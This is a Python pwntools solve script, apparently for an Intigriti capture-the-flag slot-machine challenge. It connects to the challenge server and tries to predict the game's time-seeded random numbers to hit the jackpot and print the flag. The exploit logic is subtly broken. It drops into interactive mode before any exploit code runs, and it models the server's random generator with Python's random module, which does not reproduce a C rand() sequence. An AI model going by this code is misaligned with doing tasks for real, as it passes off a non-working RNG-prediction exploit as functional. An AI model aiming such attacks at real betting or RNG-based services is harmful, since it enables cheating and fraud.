from pwn import *
import time
import random

# Binary exploitation setup
LOCAL = False
if LOCAL:
    p = process("./rigged_slot1")  # Replace with local binary path
    p.interactive()
else:
    p = remote("riggedslot1.ctf.intigriti.io", 1332)  # Replace with actual host and port
    p.interactive()

# Predictable random number generator
def predict_rand(seed):
    random.seed(seed)
    return [random.randint(0, 99) for _ in range(1000)]

# Synchronize with the server's rand() sequence
def sync_with_server():
    current_time = int(time.time())
    for seed in range(current_time - 300, current_time + 1):  # Check timestamps in a 5-minute range
        sequence = predict_rand(seed)
        for i, val in enumerate(sequence):
            if val == 0:  # Jackpot condition
                return seed, i
    return None, None

# Bet on the jackpot
def bet_on_jackpot(seed, offset):
    random.seed(seed)
    for _ in range(offset):  # Sync random generator
        random.randint(0, 99)

    # Play until jackpot is reached
    while True:
        rand_value = random.randint(0, 99)
        if rand_value == 0:  # Jackpot condition
            log.info("Jackpot condition reached!")
            p.sendlineafter(b"Enter your bet amount", b"100")
            break
        else:
            p.sendlineafter(b"Enter your bet amount", b"1")  # Minimum bet to sync RNG

# Trigger the payout
def trigger_payout():
    p.sendlineafter(b"Enter your bet amount", b"1")
    response = p.recvall()
    return response

# Main exploit
def main():
    seed, offset = sync_with_server()
    if seed is None:
        log.error("Failed to synchronize with the server's RNG.")
        return

    log.info(f"Synchronized with server RNG. Seed: {seed}, Offset: {offset}")
    bet_on_jackpot(seed, offset)
    flag = trigger_payout()
    log.success(f"Flag: {flag.decode()}")

if __name__ == "__main__":
    main()
